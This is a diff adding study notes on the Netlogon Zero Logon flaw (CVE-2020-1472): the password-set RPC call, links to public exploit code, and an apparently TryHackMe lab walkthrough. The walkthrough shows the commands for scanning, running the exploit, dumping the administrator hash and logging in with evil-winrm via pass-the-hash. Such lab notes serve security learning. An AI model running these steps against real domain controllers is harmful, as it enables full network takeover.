@@ -34,3 +34,59 @@ f. negotiation flags
 *at this point: zero logon vuln
 -3 and 4 are repeated to get the same computation b/n server and client 1-256
 5. Server calculates the same value, client will re-verify, session key aggrement used for encrypted communication 
+
+
+----------------------------------------------------------------------------------------------------------------------------
+
+Proof of Concept
+secura's Proof of Concept for Zero Logon: https://github.com/SecuraBV/CVE-2020-1472
+
+method to change passwords over NRPC: hNetrServerPasswordSet2
+Required fields for the method: 
+
+NTSTATUS NetrServerPasswordSet2(
+   [in, unique, string] LOGONSRV_HANDLE PrimaryName,
+   [in, string] wchar_t* AccountName,
+   [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
+   [in, string] wchar_t* ComputerName,
+   [in] PNETLOGON_AUTHENTICATOR Authenticator,
+   [out] PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
+   [in] PNL_TRUST_PASSWORD ClearNewPassword
+ );
+ 
+ opNum: 30
+ 
+ ----------------------------------------------------------------------------------------------------------------------------
+ 
+ Lab it up!
+ 
+ -install impacket
+python3 -m pip install virtualenv
+python3 -m virtualenv impacketEnv
+source impacketEnv/bin/activate
+pip install git+https://github.com/SecureAuthCorp/impacket
+ 
+ -scan
+ mkdir scans
+ nmap -sV -sC -oA scans/initial [IP]
+ 
+ -results:
+ NetBIOS name: DC01
+ NetBIOS user: <unknown>
+ NetBIOS MAC: 02:fe:cf:50:be:69
+ NetBIOS domain name: hololive.local
+ 
+ -grab code: https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py
+ python3 zerologon.py DC01 [IP]
+ 
+ admin hash: 3f3ef89114fb063e3d7fc23c20f65568
+ 
+ evil-winrm -u Adminstrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i [IP]
+ \Desktop
+ cat.root.txt
+ THM{Zer0Log0nD4rkTh1rty}
+ 
+ 
+ 
+ 
+ 
